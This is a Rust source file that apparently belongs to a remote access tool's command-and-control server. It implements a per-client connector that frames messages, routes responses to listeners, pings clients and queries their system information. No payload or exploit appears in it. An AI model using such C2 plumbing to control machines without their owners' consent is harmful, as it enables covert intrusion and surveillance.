use std::collections::{LinkedList, VecDeque};
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::{debug, error};
use rat_common::framework::{Module, ModuleImpl, ModuleState};
use rat_common::reader::Reader;
use rat_common::schema::{
    ClientMessage, ClientMessageData, ServerMessage, ServerMessageData, SystemInfo,
};
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::net::tcp::{OwnedReadHalf, OwnedWriteHalf};
use tokio::sync::{Mutex, RwLock, mpsc, oneshot};
use tokio::time::timeout;

use crate::config::Config;
use crate::modules::cc::listener::{ClientOnceListener, ClientPersistentListener};
use crate::modules::cc::ping::ClientPing;

pub struct ClientConnector {
    _reader: Mutex<Reader<OwnedReadHalf>>,
    _info: RwLock<Option<SystemInfo>>,
    _writer: Mutex<OwnedWriteHalf>,
    _peer: SocketAddr,
    _config: Config,
    _name: String,
    _once_listeners: Mutex<LinkedList<ClientOnceListener>>,
    _persistent_listeners: Mutex<LinkedList<ClientPersistentListener>>,
    _total_read_buf: Mutex<VecDeque<u8>>,
    _state: Arc<ModuleState>,
}

impl ClientConnector {
    pub fn new(stream: TcpStream, peer: SocketAddr, config: Config) -> Arc<Self> {
        let (reader, writer) = stream.into_split();
        Arc::new_cyclic(|this| Self {
            _reader: Mutex::new(Reader::new(reader)),
            _info: RwLock::new(None),
            _writer: Mutex::new(writer),
            _peer: peer,
            _config: config,
            _name: format!("ClientConnector [{peer}]"),
            _once_listeners: Mutex::new(LinkedList::new()),
            _persistent_listeners: Mutex::new(LinkedList::new()),
            _total_read_buf: Mutex::new(VecDeque::new()),
            _state: ModuleState::new_with_submodules(vec![Arc::new(ClientPing::new(
                peer,
                this.clone(),
                config,
            ))]),
        })
    }

    pub async fn info(&self) -> Option<SystemInfo> {
        self._info.read().await.clone()
    }

    async fn _process_message(&self, message: ClientMessage) -> anyhow::Result<()> {
        {
            let mut new_list = LinkedList::new();
            let mut listeners = self._once_listeners.lock().await;
            while let Some(listener) = listeners.pop_front() {
                if (listener.predicate)(&message) {
                    let _ = listener.completer.send(message.clone());
                } else {
                    new_list.push_back(listener);
                }
            }

            *listeners = new_list;
        }

        {
            let mut new_list = LinkedList::new();
            let mut listeners = self._persistent_listeners.lock().await;
            while let Some(listener) = listeners.pop_front() {
                if !listener.sender.is_closed() {
                    if (listener.predicate)(&message)
                        && let Err(e) = listener.sender.try_send(message.clone())
                    {
                        error!(
                            "Unable to send message to persistent listener of {}: {e}",
                            self._peer
                        );
                    }

                    new_list.push_back(listener);
                }
            }

            *listeners = new_list;
        }

        Ok(())
    }

    pub async fn send(&self, message: &ServerMessage) -> anyhow::Result<()> {
        let data = postcard::to_stdvec_cobs(message)?;
        let mut writer = self._writer.lock().await;
        writer.write_all(&data).await?;
        Ok(())
    }

    pub async fn request(&self, request: &ServerMessage) -> anyhow::Result<ClientMessage> {
        let id = request.id;
        let waiter = async move { self.wait_for(move |m| m.id == id).await };

        self.send(request).await?;
        match timeout(self._config.request_timeout, waiter).await {
            Ok(Ok(response)) => Ok(response),
            _ => {
                anyhow::bail!(
                    "Request {request:?} timed out to {} after {}s.",
                    self._peer,
                    self._config.request_timeout.as_secs(),
                )
            }
        }
    }

    pub async fn wait_for(
        &self,
        predicate: impl Fn(&ClientMessage) -> bool + Send + Sync + 'static,
    ) -> anyhow::Result<ClientMessage> {
        let (send, receive) = oneshot::channel();

        {
            let mut listeners = self._once_listeners.lock().await;
            listeners.push_back(ClientOnceListener {
                predicate: Box::new(predicate),
                completer: send,
            });
        }

        Ok(receive.await?)
    }

    pub async fn subscribe(
        &self,
        predicate: impl Fn(&ClientMessage) -> bool + Send + Sync + 'static,
    ) -> mpsc::Receiver<ClientMessage> {
        let (sender, receiver) = mpsc::channel(self._config.client_mpsc_channel_capacity);

        let mut listeners = self._persistent_listeners.lock().await;
        listeners.push_back(ClientPersistentListener {
            predicate: Box::new(predicate),
            sender,
        });

        receiver
    }

    pub async fn update_system_info(&self) -> anyhow::Result<()> {
        let response = self
            .request(&ServerMessage::new(ServerMessageData::SystemInfoQuery))
            .await?;

        if let ClientMessageData::SystemInfoQueryResponse { info } = response.data {
            self._info.write().await.replace(info);
        } else {
            anyhow::bail!("Unexpected response to system info query: {response:?}");
        }

        Ok(())
    }
}

#[async_trait]
impl ModuleImpl for ClientConnector {
    type EventType = anyhow::Result<usize>;

    fn name(&self) -> &str {
        &self._name
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut reader = self._reader.lock().await;
        Ok(reader.read().await?)
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let mut size = 0;
        let closed = match event {
            Ok(0) => true,
            Ok(s) => {
                size = s;
                false
            }
            Err(e) => {
                error!("Error when reading from {}: {e}", self._peer);
                true
            }
        };

        if closed {
            debug!("Client {} disconnected", self._peer);
            self.stop();
            return Ok(());
        }

        let mut total_read_buf = self._total_read_buf.lock().await;
        let mut offset = {
            let reader = self._reader.lock().await;
            let original_len = total_read_buf.len();
            total_read_buf.extend(reader.prefix(size));
            original_len
        };

        while offset < total_read_buf.len() {
            if total_read_buf[offset] == 0 {
                let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
                offset = 0;

                match postcard::from_bytes_cobs::<ClientMessage>(&mut frame) {
                    Ok(message) => {
                        if let Err(e) = self._process_message(message).await {
                            error!("Error processing message from {}: {e}", self._peer);
                        }
                    }
                    Err(e) => {
                        error!("Received malformed message from {}: {e}", self._peer);
                    }
                }
            } else {
                offset += 1;
            }
        }

        Ok(())
    }
}
